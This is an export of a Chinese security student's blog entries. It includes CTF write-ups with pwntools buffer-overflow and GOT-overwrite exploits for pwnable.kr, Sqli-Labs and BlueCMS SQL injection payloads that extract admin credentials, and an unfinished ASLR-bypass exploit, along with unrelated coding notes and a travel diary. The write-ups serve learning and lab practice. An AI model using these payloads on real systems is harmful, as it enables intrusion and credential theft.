pwnable.kr1234567891011121314151617181920212223242526272829passcode@ubuntu:~$ lsflag passcode passcode.cpasscode@ubuntu:~$ pythonPython 2.7.12 (default, Jul 1 2016, 15:12:24)[GCC 5.4.0 20160609] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)[*] &apos;/home/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE&gt;&gt;&gt; r = process(&quot;./passcode&quot;)[x] Starting local process &apos;./passcode&apos;[+] Starting local process &apos;./passcode&apos;: Done&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]&gt;&gt;&gt; systemAddr = 134514147&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)&gt;&gt;&gt; payload2 = str(systemAddr)&gt;&gt;&gt; r.sendline(payload1)&gt;&gt;&gt; r.sendline(payload2)&gt;&gt;&gt; print r.recv()[*] Process &apos;./passcode&apos; stopped with exit code 0Toddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) FLAG: Sorry mom.. I got confused about scanf usage :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:bof]]></title>
      <url>%2F2017%2F04%2F07%2FPwnable-kr-bof%2F</url>
      <content type="text"><![CDATA[简单栈溢出。 bof原题有提供binary和source code。 12(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bofbof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped 用IDA打开，f5: main函数： func函数： func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”) a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。 exp123456from pwn import *p = remote("pwnable.kr","9000")payload = 'a' * 52payload += p32(0xcafebabe)p.sendline(payload)p.interactive() flag]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[《The Pracetice of Programming》读书笔记（1）]]></title>
      <url>%2F2017%2F04%2F06%2F%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%2F</url>
      <content type="text"><![CDATA[《The Pracetice of Programming》读书笔记 Style Usually,the real code is mostly well down,but with something that could be improved. There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough. The principles of programming style are based on common sense guided by experience. Names labels an object and conveys information about its purpose. informative、concise、memorable, and pronounceable if possible the border the scope,the more information conveyed. suggestion 1use descriptive name for globals,short names for locals.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用python为1000php生成目录页面]]></title>
      <url>%2F2017%2F04%2F03%2F%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%2F</url>
      <content type="text"><![CDATA[1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。github地址： https://github.com/Xyntax/1000phpgit clone下来后，案例保存在bugs文件夹里，名称都是wooyun-xxx-xxxxx格式，没有索引，从名字上看也难以知道这是什么类型的漏洞。所以这里为它生成一个目录页面。 Something漏洞的简要信息保存在页面的title标签中，如下使用BeautifulSoup来对wooyun-xxx-xxxxx.html进行解析，获取其title。如下： Code1234567891011121314151617181920import sysimport osfrom bs4 import BeautifulSoupreload(sys)sys.setdefaultencoding('utf8')htmlName = os.listdir(htmlLoc)indexhtml = open("index.html","w")setCharset = '&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'indexhtml.write(setCharset)for i in htmlName: if i[0] == 'w': soup = BeautifulSoup(open(i),"html.parser") url ='&lt;a href="'+i+'"&gt;'+soup.title.string+'&lt;/a&gt;' indexhtml.write(url) indexhtml.write("&lt;/br&gt;")print "done!" Result将代码保存为py文件后，放在bugs文件夹下运行，会生成index.html文件。打开。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less1-4-writeup]]></title>
      <url>%2F2017%2F04%2F02%2FSqli-Labs-Less1-4-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less 1题目是 GET Error based- Single quotes -String。关注点：基于错误，单引号，字符型注入。 payload11http://localhost:20000/sqllab/Less-1/?id=1&apos; 此时页面会产生报错。 payload21http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,2,3 --+ 通过UNION SELECT 或者 ORDER BY 语句可以发现字段数为 3 ，可显示位置为 2,3。尾部—+会被浏览器解释为— （空格），这在mysql里是注释。 payload3获取数据库名称1http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3 FROM INFORMATION_SCHEMA.SCHEMATA --+ 利用元数据表INFORMATION_SCHEMA获取数据库信息。 获取表名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x7365637572697479 --+ 这里 hex(security)=0x7365637572697479 获取字段名12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x7573657273 --+ 获取数据12http://localhost:20000/sqllab/Less-1/?id=0&apos; UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 2题目说是数值型注入。 不需要闭合引号。给出最终payload12http://localhost:20000/sqllab/Less-2/?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 3题目提示 SINGLE QUOTES WITH TWIST。 payload11http://localhost:20000/sqllab/Less-3/?id=1&apos; 注意到报错回显中有 )，说明需要闭合。 payload2类似将Less1中的几段payload的前面的 0’ 改为 0’) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ Less 4这题需要闭合双引号。 payload11http://localhost:20000/sqllab/Less-4/?id=0&quot; 需要闭合 双引号 payload2类似将Less1中的几段payload的前面的 0’ 改为 0”) 即可 最终payload12http://localhost:20000/sqllab/Less-3/?id=0&apos;) UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x20),3 FROM security.users --+ sqlilab环境搭建下载sqlilab传送门：https://github.com/Audi-1/sqli-labs可以选择下载zip后解压或者自行git clone到本地， 推荐phpstudy传送门：http://www.phpstudy.net/a.php/211.html不懂使用的建议查一查。这里假设phpstudyd 主页为 http://localhost:20000/ 安装将sqlilab解压出来的文件夹（默认名为 sqli-labs-master）拷贝到phpstudy的WWW目录下，打开phpstudy，访问sqlilab页面( http://localhost:20000/sqli-labs-master )。点选Setup/reset Database for labs完成数据库配置。之后即可开始实验。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win下tensorflow安装避坑指南]]></title>
      <url>%2F2017%2F03%2F15%2Fwin%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0%2F</url>
      <content type="text"><![CDATA[好多同学来问怎么安装tensorflow，想想还是写一下吧。 建议 可以选择使用 virtualenv 来进行python环境的管理,这样不会混乱。 担心包与包之间的依赖问题的话，推荐直接使用 anaconda科学计算发行包。具体安装过程可参见：数据挖掘比赛（0）环境搭建之anaconda安装 原生python安装想想还是把这部分加进来了：） 避坑一：官网下载下载页面：https://www.python.org/downloads/windows/tensorflow官网上面说:tensorflow暂时只支持64bit的python3.5。所以不想折腾的同学不要去下载latest的python3.6，也不要去下python2.7，毕竟py3是未来啊。。 executable installer是把安装文件下载下来后再安装。 避坑二：安装python不想后面麻烦的话，安装时记得把 添加进系统路径 选上其余的选项不用担心，你可以自己选择安装路径，这里我直接选 Install Now了。 避坑三：试试打开cmd，输入python，应该会进入python交互式环境。如果提示不是内部或外部命令啥的，说明你的系统环境变量配置有问题。可以自己再手动添加进去，这里不提。 另外说一下，这里默认的python命令对应的版本为python3.5。 安装tensorflow避坑四：安装命令python3.5自带的pip3包管理器，我可以直接使用它来下载。1pip3 install --upgrade tensorflow 它会自动下载tensorflow及其它一些最新的依赖包。记得加上 —upgrade，不然安装的比如protobuf的版本可能相对较低后续可能会报错。然后会自动进行安装。直至如下： 避坑五：安装系统依赖包初次安装，可能会在导入的时候出错，这是因为win系统的动态链接库MSVCP140.DLL缺失的原因.有些同学在这一步没有出错，我猜你们写C语言用的是VS2015啥的hh。如下图，这里只截取部分。 去微软官网下载 Visual C++ 2015 redistributable，它包含了MSVCP140.DLL。 传送门：Visual C++ 2015 redistributable 一定要注意的是，要选择 x64 版本，对应你的64位操作系统然后安装。 测试在经过前面的步骤后，此时导入tensorflow应该没问题了。!()[http://ojp0pjljj.bkt.clouddn.com/tensor7.jpg]接下来就简单的测试一下，依次输入1234import tensorflow as tfhello = tf.constant('Hello, TensorFlow!')sess = tf.Session()print(sess.run(hello)) 好吧，好像没报错，不过一大堆的消息打印出来，心理总是有点不舒服：） 这边是关于这个问题的两个讨论，两个问题的讨论时间是在今年的2月份。 stackoverflow：unknow op github Issues: unknow op 他们所提出的“解决方法”是安装指定的这个nightly build版本，这个可以确实可以解决掉unknow op的警告问题，不过会产生另外的SSE警告。 关于python3.6有些同学可能一不小心安了python3.6，加上(anaconda官网)[https://www.continuum.io/downloads/]上的版本也已经更新为python3.6了。所以这边提供一个tensorflow-py3.6的安装包。 传送门： Python Extension Packages:tensorflow 至于能不能用，仁者见仁智者见智…… tensorflow GPU计算过程这里不展开，要装 vs+cuda+tensorflow,如果想更快的话，可以添加cudnn库。同时要求显卡是英伟达的且nvidia compute capability要大于3。此处略过不提。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[代码审计之SQL注入：BlueCMSv1.6 sp1]]></title>
      <url>%2F2017%2F03%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1%2F</url>
      <content type="text"><![CDATA[代码审计学习 工具及环境 bluecms v2.1 sp1链接：http://pan.baidu.com/s/1dFKLanR 密码：8v1c seay审计系统链接：http://pan.baidu.com/s/1dENS4KT 密码：rszt 环境PHP: 5.4.45MYSQL: 5.5.53 注入一审计用seay审计系统审计一下,定位到/ad_js.php。 该条语句为1$ad = $db-&gt;getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); getone()是自定义的函数，用来查询数据库，代码如下：12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 回到ad_js.php1"SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id 可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。 1$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; 若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。 利用 先查询列数 /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6 报错 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8 报错 ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7 无报错，且查看源代码发现数字7有回显。 提取数据利用元数据表爆出表名1ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() 爆出字段 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e 获取用户名密码 ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin 注入二审计函数定位：12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //????????????????????????????ip ??? $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; 直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ， comment.php页面其中有如下代码 $sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;; $db-&gt;query($sql); 可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。 利用这是目前的留言板： 在burp截包后，post参数如下：所以 user_id=2 id=6 即 post_id=6 对应发表留言的文章id type=1 mood=6 （这个无关紧要） 为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。 payload如下： 1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1 payload分析：1’,’1’)是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 ‘’,’6’,’2’,’1’,’6’ 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 ‘1’,’1 是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。 所以这样插入后完整的sql语句是： $sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;; Forward后 注入成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACMXMU-OJ:1005]]></title>
      <url>%2F2017%2F03%2F09%2FACMXMU-OJ-1005%2F</url>
      <content type="text"><![CDATA[题目 1005.Complete PermutationDescriptionGenerate the complete permutation of 1..N InputEach input file contains only one non-negative integer N (0&lt; N &lt; 9) OutputOutput N! Lines, according to lexicographic order. Sample Input3 Sample Output1 2 3 1 3 2 2 1 3 2 3 1 3 1 2 3 2 1 想法一开始想到用递归来写全排列，就课本上的方法，结果才发现输出时最后两个的次序不对。先试了试STL中的next_permutation函数，后面又自己写了个字典序法全排列。这里简述一下字典序法全排列 待排列“字符串”： P_0P_1P_2..P_{j-1}P_jP_{j+1}..P_n 从后往前搜索，直到找到这样的一个数，它的下标为 j，且满足 P_{j} < P_{j+1}。此时有：P_{j} < P_{j+1} > P_{j+2} > P_{j+3} > .... > P_{n}即从P{j+1} 到 P{n}，它们是按字典序递减的。 再次从后向前搜索，直到找到这样的一个数，它的下标为 k，且满足 P_{k} > P_{j}。P_k的位置如下：P_0P_1P_2..P_{j-1}P_jP_{j+1}....P_{k-1}P_{k}P_{k+1}....P_n 交换P_{k}和P_{j}的值，这时候“字符串”为：P_0P_1P_2..P_{j-1}P_kP_{j+1}....P_{k-1}P_{j}P_{k+1}....P_n这时候得到的“字符串”会比原本的“字符串”大,但并不是所有大于“原字符串”中最小的。 结合由（2）得到的大小关系,以及 P_{k} > P_{j}，可以得到交换后的“字符串”大小关系如下:....P_kP_{j+2}>....>P_{k-1}>P_{j}>P_{k+1}....>P_n所以在最后一步中，把 P{j+1}P{j+2}….P_{n} 反转过来。最后得到：P_0P_1P_2..P_{j-1}P_kP_{n}..P_{j}..P_{j+1}P_{j+2}P_{j+1}....P_n这样得到的新“字符串”是大于“原字符串”中最小的。 提交字典序法全排列先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[10];int main()&#123; int number; int q; scanf("%d",&amp;number); for(q = 1;q &lt;= number;q++) arrays[q] = q; while(true)&#123; int j,k; int q; for(q = 1;q &lt; number;q++) printf("%d ",arrays[q]); printf("%d\n",arrays[number]); for(j = number;j &gt; 0;j--) if(arrays[j] &lt; arrays[j+1]) break; if(j == 0) break; for(k = number;k &gt; j;k--) if(arrays[k] &gt; arrays[j]) break; int temp; temp = arrays[j]; arrays[j] = arrays[k]; arrays[k] = temp; int i1,i2; for(i1 = j+1,i2 = number;i1 &lt; i2;i1++,i2--) &#123; int temp; temp = arrays[i1]; arrays[i1] = arrays[i2]; arrays[i2] = temp; &#125; &#125; return 0;&#125; 使用STL123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123; int number; scanf("%d",&amp;number); int a[11]; int i; for(i = 0;i &lt; number;i++) a[i] = i + 1; do&#123; int k; for(k = 0;k &lt; number - 1;k++) printf("%d ",a[k]); printf("%d\n",a[number - 1]); &#125; while (next_permutation(a,a+number)); return 0;&#125; 递归全排列，不合要求123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int number;char arrays[11]="0123456789";void Perm(int m);int main()&#123; scanf("%d",&amp;number); int i,j; Perm(1); return 0;&#125;void Perm(int m)&#123; if (m == number)&#123; int i; for(i = 1;i &lt; m;i++) printf("%c ",arrays[i]); printf("%c\n",arrays[m]); &#125; else &#123; int i,j; for(j = m;j &lt;= number;j++)&#123; int temp; temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; Perm(m+1); temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(3)数组单调和]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C%2F</url>
      <content type="text"><![CDATA[题目现定义数组单调和为所有元素i的f(i)值之和。这里的f(i)函数定义为元素i左边(不包括其自身)小于等于它的数字之和。请设计一个高效算法，计算数组的单调和。给定一个数组A同时给定数组的大小n，请返回数组的单调和。保证数组大小小于等于500，同时保证单调和不会超过int范围。 测试样例：[1,3,5,2,4,6],6返回：27 解法12345678910111213class MonoSum &#123;public: int calcMonoSum(vector&lt;int&gt; A, int n) &#123; int sum = 0; int i,j; for (j = 1;j &lt; n;j++)&#123; for (i = 0;i &lt; j;i++)&#123; sum += A[i]&lt;=A[j]?A[i]:0; &#125; &#125; return sum; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(2)棋子翻转]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC%2F</url>
      <content type="text"><![CDATA[题目在4x4的棋盘上摆满了黑白棋子，黑白两色的位置和数目随机其中左上角坐标为(1,1),右下角坐标为(4,4),现在依次有一些翻转操作，要对一些给定支点坐标为中心的上下左右四个棋子的颜色进行翻转，请计算出翻转后的棋盘颜色。给定两个数组A和f,分别为初始棋盘和翻转位置。其中翻转位置共有3个。请返回翻转后的棋盘。 测试样例：[[0,0,1,1],[1,0,1,0],[0,1,1,0],[0,0,1,0]],[[2,2],[3,3],[4,4]]返回：[[0,1,1,1],[0,0,1,0],[0,1,1,0],[0,0,1,0]] 解法123456789101112131415161718192021222324class Flip &#123;public: vector&lt;vector&lt;int&gt; &gt; flipChess(vector&lt;vector&lt;int&gt; &gt; A, vector&lt;vector&lt;int&gt; &gt; f) &#123; int numOfRotate = 3; int temp; int i,j; for (temp = 0;temp &lt; numOfRotate;temp++)&#123; int x = f[temp][0] - 1; int y = f[temp][1] - 1; if ((y - 1) &gt;= 0) A[x][y - 1]++; if ((y + 1) &lt;= 3) A[x][y + 1]++; if ((x - 1) &gt;= 0) A[x - 1][y]++; if ((x + 1) &lt;= 3) A[x+1][y]++; &#125; for (i = 0;i &lt; 4;i++) for (j = 0;j &lt; 4;j++) A[i][j] = A[i][j]%2; return A; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CodeTrain(1)最大差值]]></title>
      <url>%2F2017%2F03%2F02%2FCodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC%2F</url>
      <content type="text"><![CDATA[题目有一个长为n的数组A，求满足0≤a≤b&lt;n的A[b]-A[a]的最大值。给定数组A及它的大小n，请返回最大差值。 测试样例：[10,5],2返回：0 法一1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i,j; for (i = 0; i &lt; n ; i++) for (j = i+1 ; j &lt; n ; j++)&#123; if (A[j] - A[i] &gt; dis) dis = A[j] - A[i]; &#125; return dis; &#125;&#125;; 法二1234567891011121314class LongestDistance &#123;public: int getDis(vector&lt;int&gt; A, int n) &#123; int min = A[0]; int dis = 0; int i; for (i = 0; i &lt; n ; i++)&#123; if (A[i] &lt; min) min = A[i]; if ((A[i] - min) &gt; dis) dis = A[i]-min; &#125; return dis; &#125;&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[记2017年阿里巴巴之行]]></title>
      <url>%2F2017%2F02%2F17%2F%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C%2F</url>
      <content type="text"><![CDATA[&emsp;&emsp;今年1月份，接到一个任务，负责组建厦门大学的互联网安全志愿者联盟队伍，我暂居队长之位。从大体上来讲，该志愿联盟偏向于业务性，而非技术性，这与我之前所接触的网络安全方向有所不同。而在今年2月15日，作为队长，受联盟邀请前往阿里巴巴参与青年领导力培训会。以下就“记流水账”地回忆一下这几天来的经历吧。 前奏&emsp;&emsp;在前往阿里巴巴之前，我被任命为HR，负责管理此次参加阿里巴巴培训会的各高校同学的信息和安全。虽然被选为组委会的同学们（大部分）都还互不相识，但在工作时配合度和效率还是非常高的。而且也很感谢慈玉姐的信任，不然以我互联网安全联盟资历之浅何以担此之任？ 2 月 15 日 晚&emsp;&emsp;我选择火车，从厦门北出发，一路颠簸。由于作为HR，需要及时的跟进各位人员的行程信息，但手机信号时好时坏，所以在沟通上也时断时续hh。&emsp;&emsp;等到了杭州，已经是下午的五点左右。三年前，曾和两知己来杭州浙大进行物竞培训，而今三人中一人去了北大一人去了浙大，不禁感慨。 &emsp;&emsp;尽管早早地坐上出租车，不过在16公里的路程中遇到了16个红灯，等到达酒店已是六点多，等收拾完毕，欧总PM招呼我和他们吃饭。在吃饭的过程中和其他联盟队伍的同学进行交谈，向欧总PM，赵zy学长，马l学姐等讨教一些关于建队和发展的事项。 &emsp;&emsp;晚上8点左右，慈玉姐给各位参会同学开个简短的小会，并在之后与组委会成员讨论进一步的后续安排。并且单独与慈玉姐探讨了本校联盟的发展方向和具体事项，并且我向慈玉姐询问了关于阿里巴巴校园俱乐部的事。俱乐部的事跟安全联盟没有关系，不过慈玉姐要帮我向其余部门的同事询问询问，太感谢了！ 2 月 16 日上午：阿里企业文化&emsp;&emsp;上午的主要内容是介绍阿里巴巴的企业文化。印象较为深刻的，首先是阿里的绩效考核机制，将个人价值观纳入绩效考核体系，最终的评价约莫有五种：明星，老黄牛，野狗，小白兔，狗。一方面在为这种考核机制感到惊讶，另一方面在想评价中没有“猫”是不是因为阿里在业内被称作“猫厂”hh。 &emsp;&emsp;再者是，阿里员工的培训与成长体系。平日有稍关注各大IT公司的层级分布，知道阿里的p层（技术岗）和m层（管理岗），但大多数时候有种割裂的感觉。而此次会上的所提到的，恰好成为链接各大层级的链环，从p6到p9+，从m1到m4+，这是个渐进的过程，同时需要职业技能的增长，也需要通用技能的提升，这属于阿里对关键人才的发展项目。同时阿里有为员工提供夜校，这是个成长的过程。 &emsp;&emsp;还有是，阿里员工的福利。阿里的食堂自不必说，讲一些特殊的。比如在阿里有所谓的”一年香，三年醇，五年陈”，阿里的员工每到一个阶段，都能获得相应的奖励，比如“五年陈”时候会被授予一枚戒指。这点有点类似暴雪公司的奖励机制，暴雪的员工在各个相应工作年限也能获得奖励，比如五年时会获得荣耀之剑。一方面是对员工过去几年奋斗的肯定，另一方面，我相信阿里和暴雪的员工都是激情的人，这种年长的奖励有点像打怪升级一样，这点对员工的归属感、成就感以及凝聚力的形成是很重要的。 &emsp;&emsp;当然还有一些阿里的小细节，这里稍微讲讲阿里对离职员工的做法。阿里有所谓的“校友日”，离职的员工能在规定的时间回来阿里。阿里能再对离职员工敞开大门，这是一种关怀；而离职员工愿意再踏进爱大门，这是一种情怀。毕竟很多企业很多公司的员工在离职后基本上就是与原公司一刀两断了。我想这种关怀和情怀是需要基于双方的，同时也是植根于企业文化的。 &emsp;&emsp;总体来说，管中窥豹可见一斑吧。 下午：安全联盟案例及其经验分享&emsp;&emsp;下午的内容，主要是来自联盟的博雷来分享一下关于互联网安全联盟的案例。涉及具体工作内容的这里不方便展开。但记得她说过的一句话：要干轰轰烈烈的事。有共鸣，有感触。有些时候的豪言壮语会显得假大空，不过对我自己而言，关于“要做轰轰烈烈的事”的想法却是没停过，不可否认有过各种失败，不过人要有梦想嘛，万一实现了呢。其实就我个人而言，身处于jsj系，但深感此系资源不足，挺（很）想在系里建立各种it公司互联网公司的各种学生俱乐部，像阿里学生俱乐部、微软学生俱乐部等等，虽然称不上轰轰烈烈，但至少也算是个想法，但愿日后能实现吧！在下午结束时，慈玉姐也分享了自己的传奇经历，吾等膜拜ing。 晚上：难得的技术交流&emsp;&emsp;晚上是晚宴。在每次做游戏中，我成功地输了n次罚了n杯酒hh。值得一提的是由于我偏向技术层面，慈玉姐这几天一直想让我与联盟的一些技术人员能有更多的交流，太感谢了！当天的晚宴上，（我觉得hh）慈玉姐特地把联盟的偏技术方向的霍金大哥安排在我座旁。霍金大哥原本就职于腾讯，后来阿里。在技术方面能有更多的共同话题，所以和霍金大哥一路从CTF聊到阿里云安全，从本科教育聊到职业规划，我从霍金大哥那里获得了许多的建议。 2 月 17 日&emsp;&emsp;这算是行程的最后一天，偏向于精神方向（或者说 虚hh）。早上由教官带领做做团体游戏，下午则游玩西溪湿地，略过不提，这里放张西溪湿地公园的照片。 &emsp;&emsp;等游完公园回到阿里巴巴总部，就是最终的小组pk。两天的小竞争中与另一组并列第一，但在最后的加赛中输啦。而许多高校同学在结束后离开，剩余一些同学则可以继续参与晚上的KTV活动，然后明天就各回各家啦。 小结&emsp;&emsp;总体上，此次阿里之旅，干货满满。硬技术能力固然重要，不过软能力软技能也重要，码农圈中有句话：“Talk is cheap，show me the code。”我觉得，如果单会show的话是无法把你的代码说清楚的，这还需要你的交际语言表达能力，这是软技能之一。此次前来，和联盟中人大多数的交谈是基于业务性的，是一种完全学习的态度，当然若是基于技术类的交谈，则会更像是交流。不过这是少数情况hh。同时此行中，认识了非常多的同学，在两天的小组pk中领略了他们的过人之处。 &emsp;&emsp;还有就是骗了好多赞哈哈 &emsp;&emsp;以此流水账记此次阿里之行]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址]]></title>
      <url>%2F2017%2F02%2F16%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%B9%8Bbypass-ASLR-%E5%88%A9%E7%94%A8DynELF%E6%A8%A1%E5%9D%97leak%E5%87%BA%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote('pwn2.jarvisoj.com', 9880)p = remote('218.2.197.235',20433)elf = ELF('./xmanlevel4')writeplt = elf.symbols['write']readplt = elf.symbols['read']vulnaddr = 0x804844bbssaddr = elf.bss(0x200)pppraddr = 0x8048509staraddr = 0x8048350def leak(address): payload = 'a'*140 payload += p32(writeplt) payload += p32(vulnaddr) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print "%#x =&gt; %s " % (address,(data or '').encode('hex')) return datadynelf = 